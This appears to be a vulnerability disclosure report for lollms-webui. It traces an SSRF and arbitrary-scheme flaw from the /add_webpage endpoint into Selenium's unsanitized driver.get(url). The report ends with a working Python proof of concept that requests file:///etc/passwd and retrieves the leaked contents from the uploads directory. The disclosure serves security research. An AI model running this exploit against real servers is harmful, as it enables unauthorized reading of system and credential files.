# Description
`LoLLm-webui` allowed users to fetch external resources via `scrape_and_save` to retrieve information as source for `RAG`tasks. Nevertheless, the unsafe use of `driver.get(url)` allowed the use of arbitrary schemes such as `file://`, `data://` to be parse as a `url` for the `webdriver.Chrome(options=chrome_options)`, resulting the use of arbitrary schemes and `SSRF`

 # Source-to-Sink

`lollms-webui/endpoints/chat_bar.py` - > `@router.post("/add_webpage")`

```python
@router.post("/add_webpage")
async def add_webpage(request: AddWebPageRequest):
    client = lollmsElfServer.session.get_client(request.client_id)
    if client is None:
        raise HTTPException(status_code=400, detail="Unknown client. This service only accepts lollms webui requests")
        
    def do_scraping():
        lollmsElfServer.ShowBlockingMessage("Scraping web page\nPlease wait...")
        ASCIIColors.yellow("Scaping web page")
        client = lollmsElfServer.session.get_client(request.client_id)
        url = request.url
        index =  find_first_available_file_index(lollmsElfServer.lollms_paths.personal_uploads_path,"web_",".txt")
        file_path=lollmsElfServer.lollms_paths.personal_uploads_path/f"web_{index}.txt"
        scrape_and_save(url=url, file_path=file_path)
        try:
            if not lollmsElfServer.personality.processor is None:
                lollmsElfServer.personality.processor.add_file(file_path, client, partial(lollmsElfServer.process_chunk, client_id = request.client_id))
                # File saved successfully
            else:
                lollmsElfServer.personality.add_file(file_path, client, partial(lollmsElfServer.process_chunk, client_id = request.client_id))
                # File saved successfully
            lollmsElfServer.HideBlockingMessage()
            lollmsElfServer.refresh_files()
        except Exception as e:
            # Error occurred while saving the file
            lollmsElfServer.HideBlockingMessage()
            lollmsElfServer.refresh_files()
            return {'status':False,"error":str(e)}
    client.generation_thread = threading.Thread(target=do_scraping)
    client.generation_thread.start()
        
    return {'status':True}
```

`@router.post("/add_webpage")` performs the following actions:

1. It retrieves a client object from the server's session using the provided `client_id`. If no such client is found, it raises an HTTP exception, indicating that the service only accepts requests from the `lollms-webui`.
2. The core function, `do_scraping`, is defined within the endpoint. This function initiates a scraping process. It starts by generating a `index` for saved `web_X.txt` file, furthermore, it pass the `index` to `file_path`, then parse these two into `scrape_and_save`

## `lollms-webui/lollms_core/lollms/internet.py` -> `scrape_and_save`

```python
def scrape_and_save(url, file_path=None, lollms_com=None, chromedriver_path=None, wait_step_delay=1, buttons_to_press=['accept']):
    if not PackageManager.check_package_installed("selenium"):
        PackageManager.install_package("selenium")
    if not PackageManager.check_package_installed("bs4"):
        PackageManager.install_package("bs4")

    from bs4 import BeautifulSoup
        
    from selenium import webdriver
    from selenium.common.exceptions import TimeoutException
    
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC

    driver = prepare_chrome_driver(chromedriver_path)

    # Navigate to the URL
    driver.get(url)
    wait_for_page(driver, wait_step_delay)
    press_buttons(driver, buttons_to_press)

    # Parse the HTML content using BeautifulSoup
    soup = BeautifulSoup(driver.page_source, 'html.parser')
    
    # Find all the text content in the webpage
    text_content = soup.get_text()
    text_content = re.sub(r'\n+', '\n', text_content)

    
    if file_path:
        # Save the text content as a text file
        with open(file_path, 'w', encoding="utf-8") as file:
            file.write(text_content)
        if lollms_com:
            lollms_com.info(f"Webpage content saved to {file_path}")
    
    # Close the driver
    driver.quit()


    return text_content
```

As we can see here, the `lollms-webui` defined the actual scraping process in `scrape_and_save`. Differs from the previous process, new update in `lollms-webui` use the `driver.get(url)` 's` headless chromium server` to simulate browser actions, additionally, it use `BeautifulSoup` to furthermore parse the result of the fetch.

```python
    try:
        driver = webdriver.Chrome(executable_path=chromedriver_path, options=chrome_options)
    except:
        driver = webdriver.Chrome(options=chrome_options)    
    return driver
```

Nevertheless, due to the lack of sanitization in `@router.post("/add_webpage")` , payloads retrieved from the endpoint will be pass directly into `driver.get(url)`, while `headless chromium server` allowed basic schemes and protocol such as `file://`, `javascript://`, `data://`. The unexpected usage of mentioned data can cause unexpected results.

## Exploiting

   ```python
   import requests
   import time
   
   def leak(client_id, filename, webid: int = None):
       
       # client_id 
       session = requests.session()
       burp0_url = "http://localhost:9600/add_webpage"
       burp0_json={"client_id": f"{client_id}", "url": f"file:///{filename}"}
       session.post(
           burp0_url, 
           json=burp0_json
           )
       
       # Get the leaked data
       if not webid:
           for i in range(0,10):
               # Assuming the file is called 
               res = session.get(
                   url=f'http://localhost:9600/uploads/web_{i}.txt'
                   ) 
               
               if "File not found" in res.text:
                   pass
               
               
               else:
                   res = session.get(
                           url=f'http://localhost:9600/uploads/web_{i}.txt'
                           )
                       
                   print("[+] Leaked Data:")
                   print(res.text)
               
               
       else:
           res = session.get(
               url=f'http://localhost:9600/uploads/web_{webid}.txt'
               )
   # Running leak twice to ensure leakage    
   leak(
       client_id="k-eLnNpf_Y22XP_CAAAB",
       filename="/etc/passwd"
   ) 
   
   leak(
       client_id="k-eLnNpf_Y22XP_CAAAB",
       filename="/etc/passwd"
   )
   ```

